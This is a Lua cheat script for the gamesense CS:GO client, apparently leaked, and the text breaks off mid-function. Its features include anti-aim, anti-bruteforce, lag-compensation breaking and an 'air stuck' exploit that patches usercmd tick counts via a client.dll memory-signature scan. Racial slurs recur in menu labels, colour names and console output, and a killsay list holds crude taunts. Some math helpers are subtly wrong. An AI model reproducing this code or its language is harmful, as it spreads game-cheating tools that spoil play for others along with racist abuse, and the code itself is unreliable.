-- only retards change this links
print('https://discord.gg/b37eKFbkPE <- scriptleaks new server')
-- https://discord.gg/b37eKFbkPE <- scriptleaks new server
local vector = require('vector')
local csgo_weapons = require('gamesense/csgo_weapons')
local http = require("gamesense/http")
local images = require ("gamesense/images")
local chat = require ("gamesense/chat")
local ent = require "gamesense/entity"
local ffi = require ("ffi")

local table_visible = function(a,b)for c,d in pairs(a)do if type(a[c])=='table'then for e,d in pairs(a[c])do ui.set_visible(a[c][e],b)end else ui.set_visible(a[c],b)end end end

local obex = obex_fetch and obex_fetch() or {username = 'nigga', build = 'source', discord=''}

local function contains(tab, val)
	for i = 1, #tab do
		if tab[i] == val then
			return true
		end
	end
	return false
end

local function angle_vector(x, y)
	local sy, cy, sp, cp = math.rad(y), math.rad(y), math.rad(x), math.rad(x)
	return math.cos(cp) * math.cos(cy), math.cos(cp) * math.sin(sy), -math.sin(sp) 
end

local function normalize_yaw(yaw)
	while yaw > 180 do
		yaw = yaw - 3	
	end
	while yaw < -180 do
		yaw = yaw + 360			
	end
	return yaw
end

local function w2s(xdelta, ydelta)
	if xdelta == 0 and ydelta == 0 then
		return 0
	end
	return math.deg(math.atan2(ydelta, xdelta))
end

local function calculate_angle(x, y, x1, y1)
	local yd =  y - y1
	local xd = x - x1
	local rel = math.atan( yd / xd )

	rel = normalize_yaw( rel * 180 / math.pi )

	if xd >= 0 then
		rel = normalize_yaw(rel + 180)
	end

	return rel
end

local function dist(v1, v2, v3)
	local d = (v1 - v2) / v1:dist(v2)
	local v = v3 - v2
	local t = v:dot(d)
	local P = v2 + d:scaled(t)
	return P:dist(v3)
end

local function calc_vec(pitch, yaw)
	local sinp = math.sin(math.rad(pitch))
	local cosp = math.cos(math.rad(pitch))
	local siny = math.sin(math.rad(yaw))
	local cosy = math.cos(math.rad(yaw))

	return cosp * cosy,cosp * siny, -sinp
end

local function Split(s, delimiter)--tysm random guy on the internet
    result = {};
    for match in (s..delimiter):gmatch("(.-)"..delimiter) do
        table.insert(result, match);
    end
    return result;
end

local locations = {
    aa = {'AA', 'Anti-aimbot angles'},
    fl = {'AA', 'Fake lag'},
    other = {'AA', 'Other'},

    aimbot = {'RAGE', 'Aimbot'},
    aimbot_other = {'RAGE', 'Other'},

    lua_tab = {'LUA', 'B'},
    --aimbot = {"RAGE"}
}

local saved_vars = {
    edgeyawvalue = 0,
    tracedwallvalue = 0,
    traceddamagevalue = 0,
    lastInverted = 0,

    bruteCurrent = {},
    bruteSwap = {},
    bruteTime = {},
    bruteLastInverted = {},
    bruteShots = {},

    setIdealTick = false,

    aimbotLog = { text = {}, curtime = {}, cur_pos = {}, alpha = {}, color = {} },
    lastCharged = 0,

    lcTeleported = false,

    ignoreTarget = {},
    staredTime = {},
    roundStarted = 0,

    manual_state = 0,
    manual_time = {
        left = 0,
        right = 0,
        forward = 0,
        local_view = 0,
    },

    playerstate = 0, -- 1 = stand, 2 = moving, 3 = inair, 4 = duck, 5 = duck_inair, 6 = slowwalk
    statenames = {'standing', 'moving', 'in air', 'crouching', 'in air', 'slow motion'},

    hitbox_pos = {}, misses = {}, fired = {}, hit = {}, shot_at = nil, alpha = {}, inaccurate = {}, allow_network = {},
    eyeposleft = nil, eyeposright = nil, eyeposfarleft = nil, eyeposfarright = nil,

    class = {"CWorld","CCSPlayer","CFuncBrush"},
    is_current_brute = false,
    forced_reset = false,
    current_time = 0,
    
    steam_ids = {
        2657889, --noodle
    },

    killsay = {
        'lets go band fo band on IG live',
        'Freddy Fazbear did nun wrong',
        'This cute cats name is "how to make a pipe bomb" look him up',
        'U wanna be banned for life ? Plus panel removed',
        "Im New To C++",
        "My neighors cats nut was bussin in my mouthhh fuck gimme more.",
        "What you know abt that us tax evasion method",
    },

    dt_charge = false,
    skeet_extrapolate = false,

    whitelisted_words = {
        ["slayall"] = "killvector",
        ["cheeseburger"] = "https://www.youtube.com/watch?v=vB6I5yaz7oE",
        ["cab"] ='https://www.youtube.com/watch?v=BtLSaxRnIhc',
        ["bird"] = 'https://www.youtube.com/watch?v=uISok580jBE',
        ["checka"] = "say " .. obex.username,
    },
    
    last_global = globals.curtime(),
}

local function set_blank_table()
    for i=1, 64 do
        saved_vars.misses[i] = 0
        saved_vars.bruteShots[i] = 0
    end
end
set_blank_table()

local reference = {
    aa = {
        enabled = ui.reference(locations.aa[1], locations.aa[2], 'Enabled'),
        pitch = ui.reference(locations.aa[1], locations.aa[2], 'Pitch'),
        yaw_base = ui.reference(locations.aa[1], locations.aa[2], 'Yaw base'),
        yaw = {ui.reference(locations.aa[1], locations.aa[2], 'Yaw')},
        yaw_jitter = {ui.reference(locations.aa[1], locations.aa[2], 'Yaw jitter')},
        body_yaw = {ui.reference(locations.aa[1], locations.aa[2], 'Body yaw')},
        fs_body_yaw = ui.reference(locations.aa[1], locations.aa[2], "Freestanding body yaw"),
        fake_limit = ui.reference(locations.aa[1], locations.aa[2], 'Fake yaw limit'),
        edge_yaw = ui.reference(locations.aa[1], locations.aa[2], 'Edge yaw'),
        freestanding = {ui.reference(locations.aa[1], locations.aa[2], 'Freestanding')},
        roll_aa = {ui.reference(locations.aa[1], locations.aa[2], 'Roll')},
    },

    fl = {
        enabled = {ui.reference(locations.fl[1], locations.fl[2], 'Enabled')},
        amount = ui.reference(locations.fl[1], locations.fl[2], 'Amount'),
        variance = ui.reference(locations.fl[1], locations.fl[2], 'Variance'),
        limit = ui.reference(locations.fl[1], locations.fl[2], 'Limit'),
    },

    other = {
        slowmotion = {ui.reference(locations.other[1], locations.other[2], 'Slow motion')},
        legmovement = ui.reference(locations.other[1], locations.other[2], 'Leg movement'),
        onshot_aa = {ui.reference(locations.other[1], locations.other[2], 'On shot anti-aim')},
        fake_peek = {ui.reference(locations.other[1], locations.other[2], 'Fake peek')},
    },

    aimbot = {
        double_tap = {ui.reference(locations.aimbot[1], locations.other[2], 'Double tap')},
        quick_peek = {ui.reference(locations.aimbot[1], locations.other[2], 'Quick peek assist')},
        fd = ui.reference(locations.aimbot[1], locations.other[2], 'Duck peek assist'),

        force_baim = ui.reference(locations.aimbot[1], locations.other[2], 'Force body aim'),
        force_sp = ui.reference(locations.aimbot[1], locations.aimbot[2], 'Force safe point'),
    }
}

local checkbox = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFFNigga massa switch')
local tabs = ui.new_combobox(locations.aa[1], locations.aa[2], '\aB1BFEFFFSwitch Tabs', {'AntiAim', 'Visuals', 'Misc', 'Config'})
--local lol = ui.new_label(locations.aa[1], locations.aa[2], '----------------------------------------')

local menu = {
    AntiAim = {
        freestanding = ui.new_combobox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Desync freestanding', {'Default', 'Reverse', 'Adaptive'}),
        yaw_base = ui.new_combobox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Yaw base mode', {'Static', 'Dynamic', 'Jitter'}),
      
        settings = ui.new_multiselect(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Anti-aim extras', {'Jitter on vulnerable', 'Force height based', 'Legit anti-aim', 'Anti-aim extra safety'}),
        legit_antiaim_hk = ui.new_hotkey(locations.aa[1], locations.aa[2], '\nlegit_aa_hk', true, 0x45),
        brute_disabler = ui.new_multiselect(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Disable anti brute', {'Standing', 'Moving', 'Slow motion', 'In air', 'Crouching'}),
        brute_misses = ui.new_slider(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Anti brute misses', 0, 5, 1, true, '', 1, {[0] = "disabled"}),

        manual_aa = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Manual anti-aim'),
        manual_aa_l = ui.new_hotkey(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Force left'),
        manual_aa_r = ui.new_hotkey(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Force right'),
        manual_aa_f = ui.new_hotkey(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Force forward'),
        manual_aa_reset = ui.new_hotkey(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Force reset'),
        manual_aa_b = ui.new_hotkey(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Anti-Aim]\aCDCDCDFF Force local view'),

        --hide_aa = ui.new_label(locations.aa[1], locations.aa[2], '----------------------------------------'),
    },

    Misc = {
            
        ideal_tick = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Ideal tick'),
        ideal_tick_keybind = ui.new_hotkey(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Ideal tick key', true, 0x05),
        ideal_tick_options = ui.new_multiselect(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Ideal tick options', {"Freestanding", "Double tap", "Quick peek", "Disable on osaa", "Single-fire snipers"}),

        ideal_tick_dt_fallback = ui.new_combobox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Double tap fallback', {'Toggle','On hotkey','Off hotkey','Always on'}),
        ideal_tick_qp_fallback = ui.new_combobox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Quick peek fallback', {'Toggle','On hotkey','Off hotkey','Always on'}),
        static_legs = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Static legs animation'),
        zero_pitch_land = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Zero pitch animation'),
        air_walk = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Air walk animation'),

        auto_break_lc = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Auto break lagcomp'),
        auto_break_lc_hotkey = ui.new_hotkey(locations.aa[1], locations.aa[2], '\nauto_break_lc_hotkey', true),

        auto_break_lc_weapon = ui.new_multiselect(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Auto break lc weapons', {'Autosniper', 'SSG 08', 'AWP', 'Knife', 'Taser'}),

        freestand_key = ui.new_hotkey(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Freestanding key', false),
        edge_yaw_key = ui.new_hotkey(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Edge yaw key', false),
    
        clantag_spammer = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Clantag spammer', false),
        killsay = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Real hood nigga killsay', false),

        aichatbot = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF AI chatbot', false),
        aichatbotenemy = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF AI chatbot enemy only', false),
        airstuckdemon = ui.new_hotkey(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Misc]\aCDCDCDFF Air stuck')

        --hide_misc = ui.new_label(locations.aa[1], locations.aa[2], '----------------------------------------'),
    },

    Visuals = {
        indicator_mode = ui.new_combobox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Visuals]\aCDCDCDFF Indicator modes', {'Default', 'Modern', 'Legacy[1]','Legacy[2]', 'Off'}),
        indicator_color = ui.new_color_picker(locations.aa[1], locations.aa[2], '\nindicator_color', 177,191,239, 255),
        indicator_disabler = ui.new_multiselect(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Visuals]\aCDCDCDFF Indicator disablers', {'Peek arrows', 'Manual arrows'}),
        prim_peek = ui.new_checkbox(locations.aa[1], locations.aa[2], '\aB1BFEFFF[Visuals]\aCDCDCDFF Old prim peek circle'),
        peek_color = ui.new_color_picker(locations.aa[1], locations.aa[2], '\npeek_color', 177,191,239, 255),

        --hide_vis = ui.new_label(locations.aa[1], locations.aa[2], '----------------------------------------'),    
    },

    Config = {

        cfg_comingsoon = ui.new_label(locations.aa[1], locations.aa[2], '\aFFE978FFCOMING SOON!!!'),
        cfg_import = ui.new_button(locations.aa[1], locations.aa[2], '\aB1BFEFFFImport from clipboard', function() end),
        cfg_export = ui.new_button(locations.aa[1], locations.aa[2], '\aB1BFEFFFExport to clipboard', function() end),

        --hide_config = ui.new_label(locations.aa[1], locations.aa[2], '----------------------------------------'),    
    }
}

-- local default = ui.new_button(locations.aa[1], locations.aa[2], 'default settings', function()
--    ui.set(menu.AntiAim.freestanding, 'adaptive')
--    ui.set(menu.AntiAim.yaw_base, 'static')
--    ui.set(menu.AntiAim.settings, {'force height based', 'legit anti-aim'})

--    ui.set(menu.AntiAim.manual_aa, true)
--    ui.set(menu.AntiAim.brute_disabler, {"crouching"})

--    ui.set(checkbox, true)
-- end)

if obex.build == "User" then
    obex.build = "LIVE"
end
if obex.build == "Beta" then
    obex.build = "BETA"
end

local function colour_console(prefix, text, string)
    client.color_log(prefix[1], prefix[2], prefix[3], "[NIGGA] \0")
    client.color_log(text[1], text[2], text[3], string)
end

local col = {
    nigga_blue = {
        177, 191, 239
    },
    nigga_white = {
        207, 207, 207
    },
    nigga_red = {
        255, 100, 100
    },
    nigga_darkblue = {
        177, 191, 239
    },
    nigga_green = {
        0, 255, 21
    },
    nigga_pink = {
        255, 154, 255
    }
}

function logo()
    colour_console(col.nigga_blue, col.nigga_white, "Logged in as \0")
    client.color_log(col.nigga_blue[1], col.nigga_blue[2], col.nigga_blue[3], obex.username .. " | " .. obex.build)
end
logo()

function runscript()
    ui.set(checkbox, true)
end
runscript()

local function get_enemy()
    local enemies = entity.get_players(true)
	local lx, ly, lz = client.eye_position()
	local view_x, view_y, roll = client.camera_angles()
	local bestenemy = nil
	local fov = 180
	for i = 1, #enemies do
		local cur_x, cur_y, cur_z = entity.get_prop(enemies[i], "m_vecOrigin")
		local cur_fov = math.abs(normalize_yaw(w2s(lx - cur_x, ly - cur_y) - view_y + 180))
		if cur_fov < fov then
			fov = cur_fov
			bestenemy = enemies[i]
		end
	end
	return bestenemy	
end

local js = panorama.loadstring([[
    return {
        OpenExternalBrowserURL: function(url){
            void SteamOverlayAPI.OpenExternalBrowserURL(url)
        }
    }
]])()

ffi.cdef[[
        struct cusercmd
        {
            struct cusercmd (*cusercmd)();
            int     command_number;
            int     tick_count;
        };
        typedef struct cusercmd*(__thiscall* get_user_cmd_t)(void*, int, int);
    ]]

    local signature_ginput = "\xB9\xCC\xCC\xCC\xCC\x8B\x40\x38\xFF\xD0\x84\xC0\x0F\x85"
    local match = client.find_signature("client.dll", signature_ginput) or error("sig1 not found")
    local g_input = ffi.cast("void**", ffi.cast("char*", match) + 1)[0] or error("match is nil")
    local g_inputclass = ffi.cast("void***", g_input)
    local g_inputvtbl = g_inputclass[0]
    local rawgetusercmd = g_inputvtbl[8]
    local get_user_cmd = ffi.cast("get_user_cmd_t", rawgetusercmd)
    local get = ui.get

local function setup_command(cmd)
    if not ui.get(checkbox) then 
        return 
    end

    local cmd = get_user_cmd(g_inputclass , 0, cmd.command_number)
    if ui.get(menu.Misc.airstuckdemon) then
    	cmd.tick_count = 0x7F7FFFFF
    	cmd.command_number = 0x00000 -- if this is = to cmd.tick_count then when someone peeks you'll instantly crash.
    end

    local closest_enemy = get_enemy()
    local eye_position = {client.eye_position()}

    local force_brute = false

    local doubletap_ready = (ui.get(reference.aimbot.double_tap[1]) and ui.get(reference.aimbot.double_tap[2]) and not ui.get(reference.aimbot.fd)) and true
	local player_tickbase = entity.get_prop(entity.get_local_player(), 'm_nTickbase')
	local curtime = globals.tickinterval() * (player_tickbase - 13)

    if entity.get_player_weapon(entity.get_local_player()) then
	    saved_vars.dt_charge = (doubletap_ready and ( curtime > entity.get_prop(entity.get_local_player(), 'm_flNextAttack') and curtime > entity.get_prop(entity.get_player_weapon(entity.get_local_player()), 'm_flNextPrimaryAttack'))) and true or false
    else
        saved_vars.dt_charge = false
    end

    local player_inair = bit.band(entity.get_prop(entity.get_local_player(), 'm_fFlags'), 1) == 0
    local player_velocity = vector(entity.get_prop(entity.get_local_player(), 'm_vecVelocity')):length2d()
    local player_moving = player_velocity >= 10 and not (ui.get(reference.other.slowmotion[1]) and ui.get(reference.other.slowmotion[2])) and not player_inair
    local player_duck = entity.get_prop(entity.get_local_player(), 'm_bDucked') == 1
    local player_sw = (ui.get(reference.other.slowmotion[1]) and ui.get(reference.other.slowmotion[2])) and not player_inair
    local player_standing = not player_inair and not player_moving and not player_duck and not player_sw
 
    local yaw_offset = 0

    saved_vars.playerstate = (player_standing) and 1 or (player_moving and not player_duck) and 2 or (player_inair and not player_duck) and 3 or (not player_inair and player_duck) and 4 or (player_inair and player_duck) and 5 or (player_sw and not player_duck) and 6

    local disable_brute = contains(ui.get(menu.AntiAim.brute_disabler), saved_vars.statenames[saved_vars.playerstate])

    if closest_enemy ~= nil then
        local flags_esp = entity.get_esp_data(closest_enemy)
        saved_vars.skeet_extrapolate = bit.band(flags_esp.flags, 2048) == 2048

        if saved_vars.bruteCurrent[closest_enemy] and saved_vars.bruteShots[closest_enemy] >= ui.get(menu.AntiAim.brute_misses) then
            if globals.curtime() >= saved_vars.bruteTime[closest_enemy] + 3 or ui.get(menu.AntiAim.brute_misses) == 0 then
                saved_vars.bruteLastInverted[closest_enemy] = 0
                saved_vars.bruteCurrent[closest_enemy] = false
                saved_vars.bruteTime[closest_enemy] = nil
                saved_vars.bruteShots[closest_enemy] = 0
            end 
        end

        if not ( (saved_vars.bruteCurrent[closest_enemy] and saved_vars.bruteShots[closest_enemy] >= ui.get(menu.AntiAim.brute_misses) and not disable_brute) and not (contains( ui.get(menu.AntiAim.settings), 'legit anti-aim') and ui.get(menu.AntiAim.legit_antiaim_hk)) ) then
            local enemy_origin = {entity.get_prop(closest_enemy, "m_vecOrigin")}
            local enemy_eyeoffset = entity.get_prop(closest_enemy, "m_vecViewOffset[2]")

            enemy_origin[3] = enemy_origin[3] + enemy_eyeoffset

            local diff_degree = calculate_angle(eye_position[1], eye_position[2], enemy_origin[1], enemy_origin[2])

            local left_based = {angle_vector(0, diff_degree + 90)}
            local right_based = {angle_vector(0, diff_degree - 90)}

            local pos_left = {eye_position[1] + left_based[1] * 20, eye_position[2] + left_based[2] * 20, eye_position[3] + left_based[3] * 100}
            local pos_right = {eye_position[1] + right_based[1] * 20, eye_position[2] + right_based[2] * 20, eye_position[3] + right_based[3] * 100}

            local pos_far_left = {eye_position[1] + left_based[1] * 100, eye_position[2] + left_based[2] * 100, eye_position[3] + left_based[3] * 100}
            local pos_far_right = {eye_position[1] + right_based[1] * 100, eye_position[2] + right_based[2] * 100, eye_position[3] + right_based[3] * 100}
        
            local damage = {
                left = {client.trace_bullet(closest_enemy, enemy_origin[1], enemy_origin[2], enemy_origin[3], pos_left[1], pos_left[2], pos_left[3], true)},
                right = {client.trace_bullet(closest_enemy, enemy_origin[1], enemy_origin[2], enemy_origin[3], pos_right[1], pos_right[2], pos_right[3], true)},
                farleft = {client.trace_bullet(closest_enemy, enemy_origin[1], enemy_origin[2], enemy_origin[3], pos_far_left[1], pos_far_left[2], pos_far_left[3], true)},
                farright = {client.trace_bullet(closest_enemy, enemy_origin[1], enemy_origin[2], enemy_origin[3], pos_far_right[1], pos_far_right[2], pos_far_right[3], true)},
            }

            local conditions = {
                visible = (damage.left[2] ~= 0 and damage.right[2] ~= 0),
                damageLeft = (damage.left[2] > damage.right[2] or damage.farleft[2] > damage.right[2] or damage.farleft[2] > damage.farright[2]) and not (damage.left[2] ~= 0 and damage.right[2] ~= 0),
                damageRight = (damage.right[2] > damage.left[2] or damage.farright[2] > damage.left[2] or damage.farright[2] > damage.farleft[2]) and not (damage.left[2] ~= 0 and damage.right[2] ~= 0),
            }

            saved_vars.traceddamagevalue = conditions.damageLeft and 1 or conditions.damageRight and 2 or conditions.visible and 3 or 4
        else
            if saved_vars.bruteShots[closest_enemy] >= ui.get(menu.AntiAim.brute_misses) then
                force_brute = true
            end

            saved_vars.traceddamagevalue = saved_vars.bruteLastInverted[closest_enemy]
            saved_vars.current_time = saved_vars.bruteTime[closest_enemy]
        end
    else
        saved_vars.skeet_extrapolate = false
        saved_vars.traceddamagevalue = 0
    end

    saved_vars.is_current_brute = force_brute

    local camera_angles = {client.camera_angles()}

    local angles_left = {angle_vector(0, camera_angles[2] - 45)}
    local angles_right = {angle_vector(0, camera_angles[2] + 45)} 

    angles_left[1], angles_left[2], angles_left[3] = angles_left[1] * 128, angles_left[2] * 128, angles_left[3] * 128
    angles_right[1], angles_right[2], angles_right[3] = angles_right[1] * 128, angles_right[2] * 128, angles_right[3] * 128
    
    endpos_left = {eye_position[1] + angles_left[1], eye_position[2] + angles_left[2], eye_position[3] + angles_left[3]}
    endpos_right = {eye_position[1] + angles_right[1], eye_position[2] + angles_right[2], eye_position[3] + angles_right[3]}

    local results = {
        left = {client.trace_line(entity.get_local_player(), eye_position[1], eye_position[2], eye_position[3], endpos_left[1], endpos_left[2], endpos_left[3])},
        right = {client.trace_line(entity.get_local_player(), eye_position[1], eye_position[2], eye_position[3], endpos_right[1], endpos_right[2], endpos_right[3])}
    }

    saved_vars.tracedwallvalue = results.left[1] < results.right[1] and 1 or results.right[1] < results.left[1] and 2 or 3
    
    ui.set(reference.aa.yaw_base, ((ui.get(menu.AntiAim.manual_aa_b) and ui.get(menu.AntiAim.manual_aa)) or saved_vars.manual_state ~= 0) and 'Local view' or 'At Targets')
    ui.set(reference.aa.yaw[1], '180')
    ui.set(reference.aa.body_yaw[1], 'Static')
    ui.set(reference.aa.fake_limit, 60)

    ui.set(reference.aa.pitch, 'Down')
    ui.set(reference.aa.yaw_jitter[1], 'Offset')
    ui.set(reference.aa.yaw_jitter[2], 0)

    if (ui.get(menu.AntiAim.freestanding) == "Reverse" or (ui.get(menu.AntiAim.freestanding) == "Adaptive" and saved_vars.traceddamagevalue == saved_vars.tracedwallvalue and player_velocity >= 110) and not player_inair) or (contains( ui.get(menu.AntiAim.settings), 'Legit anti-aim') and ui.get(menu.AntiAim.legit_antiaim_hk)) then
        saved_vars.tracedwallvalue = saved_vars.tracedwallvalue == 1 and 2 or saved_vars.tracedwallvalue == 2 and 1 or saved_vars.tracedwallvalue
        saved_vars.traceddamagevalue = saved_vars.traceddamagevalue == 1 and 2 or saved_vars.traceddamagevalue == 2 and 1 or saved_vars.traceddamagevalue
    end

    local force_jit_vuln = contains(ui.get(menu.AntiAim.settings), 'Jitter on vulnerable') and saved_vars.traceddamagevalue == 3

    if saved_vars.traceddamagevalue ~= 4 and saved_vars.traceddamagevalue ~= 0 then
        if not force_jit_vuln then
            if (ui.get(menu.AntiAim.yaw_base) == "Jitter") or (ui.get(menu.AntiAim.yaw_base) == "Dynamic" and (saved_vars.traceddamagevalue ~= saved_vars.tracedwallvalue)) then
                ui.set(reference.aa.body_yaw[1], 'Jitter')
            end

            ui.set(reference.aa.body_yaw[2], saved_vars.traceddamagevalue == 1 and -180 or saved_vars.traceddamagevalue == 2 and 180 or 180)
        else
            ui.set(reference.aa.body_yaw[1], 'Jitter')
            ui.set(reference.aa.body_yaw[2], 0)
        end
    else
        if (ui.get(menu.AntiAim.yaw_base) ~= "Static")  then
            ui.set(reference.aa.body_yaw[1], 'Jitter')
        end 

        ui.set(reference.aa.body_yaw[2], saved_vars.tracedwallvalue == 1 and -180 or saved_vars.tracedwallvalue == 2 and 180 or 180)
    end 

    if ui.get(menu.AntiAim.yaw_base) ~= "Static" then
        if ui.get(reference.aa.body_yaw[1]) == "Jitter" then
            ui.set(reference.aa.yaw_jitter[2], -10)
        else
            if player_velocity >= 100 then
                ui.set(reference.aa.yaw_jitter[2], ui.get(reference.aa.body_yaw[2]) >= 0 and 5 or -5)
            end
        end
    end
    
    if saved_vars.playerstate == 1 or saved_vars.playerstate == 4 then
        if saved_vars.playerstate == 4 then
            yaw_offset = ui.get(reference.aa.body_yaw[2]) >= 0 and 10 or -2
            ui.set(reference.aa.fake_limit, ui.get(reference.aa.body_yaw[2]) >= 0 and 45 or 33)

            ui.set(reference.aa.body_yaw[1], 'Static')
        end

        if closest_enemy ~= nil then
            local ent_pos = vector(entity.get_prop(closest_enemy, 'm_vecOrigin'))
            local lp_pos = vector(entity.get_prop(entity.get_local_player(), 'm_vecOrigin'))

            local dist = lp_pos:dist2d(ent_pos)
            local height = lp_pos.z - ent_pos.z

            if contains(ui.get(menu.AntiAim.settings), 'Force height based') and dist <= 700 and height >= 100 then
                yaw_offset = 5
                ui.set(reference.aa.body_yaw[1], 'Static')
                ui.set(reference.aa.body_yaw[2], 180)
                ui.set(reference.aa.fake_limit, 25)

                ui.set(reference.aa.yaw_jitter[2], 0)
            end
        end
    elseif saved_vars.playerstate == 6 then
        yaw_offset = 10
        ui.set(reference.aa.body_yaw[1], 'Static')
        ui.set(reference.aa.body_yaw[2], 180)
        ui.set(reference.aa.fake_limit, client.random_int(14, 35))

        ui.set(reference.aa.yaw_jitter[2], 0)
    elseif saved_vars.playerstate == 3 or saved_vars.playerstate == 5 then
        ui.set(reference.aa.fake_limit, 60)
        if saved_vars.playerstate == 3 or (saved_vars.playerstate == 5 and not contains( ui.get(menu.AntiAim.settings), 'Anti-aim extra safety')) then
            if ui.get(menu.AntiAim.yaw_base) == "Dynamic" then
                ui.set(reference.aa.body_yaw[1], 'Jitter')
                ui.set(reference.aa.body_yaw[2], 0)
            end
        elseif (saved_vars.playerstate == 5 and  contains( ui.get(menu.AntiAim.settings), 'Anti-aim extra safety')) then
            yaw_offset = 15
            ui.set(reference.aa.body_yaw[1], 'Static')
            ui.set(reference.aa.body_yaw[2], 180)
            ui.set(reference.aa.fake_limit, 60)

            ui.set(reference.aa.yaw_jitter[2], 0)
        end
    elseif saved_vars.playerstate == 2 then
        ui.set(reference.aa.fake_limit, 24)
    end
    
    if force_brute and not disable_brute then
        ui.set(reference.aa.fake_limit, 60)
        ui.set(reference.aa.yaw[2], 60)
        ui.set(reference.aa.yaw_jitter[2], 0)
        
        ui.set(reference.aa.body_yaw[2], saved_vars.traceddamagevalue == 1 and -180 or 180)
    end
    
    if ui.get(menu.AntiAim.manual_aa) then
        if ui.get(menu.AntiAim.manual_aa_l) and globals.curtime() < saved_vars.manual_time.left + 0.03 then
            if saved_vars.manual_state ~= -90 then
                saved_vars.manual_state = -90
            else
                saved_vars.manual_state = 0
            end
        elseif not ui.get(menu.AntiAim.manual_aa_l) then
            saved_vars.manual_time.left = globals.curtime()
        end

        if ui.get(menu.AntiAim.manual_aa_r) and globals.curtime() < saved_vars.manual_time.right + 0.03 then
            if saved_vars.manual_state ~= 90 then
                saved_vars.manual_state = 90
            else
                saved_vars.manual_state = 0
            end
        elseif not ui.get(menu.AntiAim.manual_aa_r) then
            saved_vars.manual_time.right = globals.curtime()
        end

        if ui.get(menu.AntiAim.manual_aa_f) and globals.curtime() < saved_vars.manual_time.forward + 0.03 then
            if saved_vars.manual_state ~= 180 then
                saved_vars.manual_state = 180
            else
                saved_vars.manual_state = 0
            end
        elseif not ui.get(menu.AntiAim.manual_aa_f) then
            saved_vars.manual_time.forward = globals.curtime()
        end

        if ui.get(menu.AntiAim.manual_aa_reset) then
            saved_vars.manual_state = 0
        end
    else
        saved_vars.manual_state = 0
    end

    if saved_vars.manual_state == 0 then
        ui.set(reference.aa.yaw[2], yaw_offset)
    else
        ui.set(reference.aa.yaw[2], saved_vars.manual_state)
    end

    local weapons = entity.get_player_weapon(entity.get_local_player())
    local cs_weapons = csgo_weapons(weapons)

    cs_weapons.name = string.lower(cs_weapons.name)
    cs_weapons.type = (cs_weapons.type == "sniperrifle" and cs_weapons.name ~= "ssg 08" and cs_weapons.name ~= "awp") and "autosniper" or cs_weapons.type

    if ui.get(menu.Misc.auto_break_lc) and ui.get(menu.Misc.auto_break_lc_hotkey) and closest_enemy ~= nil and ( contains(ui.get(menu.Misc.auto_break_lc_weapon), cs_weapons.name) or contains(ui.get(menu.Misc.auto_break_lc_weapon), cs_weapons.type) )  then
        if saved_vars.skeet_extrapolate and not saved_vars.lcTeleported then
            if saved_vars.statenames[saved_vars.playerstate] == "in air" then
                ui.set(reference.aimbot.double_tap[1], false)
            end

            client.delay_call(0.01, function()
                if not ui.get(reference.aimbot.double_tap[1]) then
                    ui.set(reference.aimbot.double_tap[1], true)
                end
            end)

            saved_vars.lcTeleported = true
        elseif not saved_vars.skeet_extrapolate then
            saved_vars.lcTeleported = false
        end
    end

    ui.set(reference.aa.freestanding[1], ui.get(menu.Misc.freestand_key) and "Default" or '-')
    ui.set(reference.aa.freestanding[2], 'Always on')

    ui.set(reference.aa.edge_yaw, ui.get(menu.Misc.edge_yaw_key))

    if ui.get(menu.Misc.ideal_tick) then
        if ui.get(menu.Misc.ideal_tick_keybind) and (not contains(ui.get(menu.Misc.ideal_tick_options), 'Single-fire snipers') or (cs_weapons.name == "SSG 08" or cs_weapons.name == "AWP")) and (not contains(ui.get(menu.Misc.ideal_tick_options), 'Disable on osaa') or (not (ui.get(reference.other.onshot_aa[1]) and ui.get(reference.other.onshot_aa[2]))) ) and not ui.get(reference.aimbot.fd) then
            if saved_vars.manual_state == 0 and contains(ui.get(menu.Misc.ideal_tick_options), 'Freestanding') then
                ui.set(reference.aa.freestanding[1], "Default")
            end

